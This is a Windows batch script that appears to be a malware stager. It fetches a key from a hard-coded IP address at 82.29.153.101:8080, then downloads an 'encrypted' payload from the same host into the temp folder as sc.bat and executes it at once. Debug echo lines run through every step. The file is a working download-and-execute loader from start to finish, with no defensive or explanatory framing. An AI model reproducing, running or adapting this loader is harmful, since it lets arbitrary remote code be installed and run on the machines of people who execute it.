@echo off
setlocal

echo [INFO] ===== START =====
echo [INFO] BASE=http://82.29.153.101:8080
echo [INFO] FILE=%temp%\sc.bat

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

echo [INFO] ===== TS =====
echo [INFO] Generating timestamp...

REM ===== TS =====
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i

echo [DEBUG] TS=%TS%

echo [INFO] ===== KEY =====
echo [INFO] Requesting KEY from %BASE%/auth/key?ts=%TS%

REM ===== KEY =====
for /f %%i in ('curl -s "%BASE%/auth/key?ts=%TS%"') do set KEY=%%i

echo [DEBUG] KEY=%KEY%

echo [INFO] ===== PAYLOAD =====
echo [INFO] Downloading payload to %FILE%

REM ===== PAYLOAD =====
curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"

echo [DEBUG] curl exit code=%errorlevel%
if exist "%FILE%" (
    echo [DEBUG] Payload file exists
) else (
    echo [ERROR] Payload file NOT found
)

echo [INFO] ===== EXEC =====
echo [INFO] Executing %FILE%

REM ===== EXEC (sincrono) =====
call "%FILE%"

echo [DEBUG] Execution exit code=%errorlevel%
echo [INFO] ===== END =====

endlocal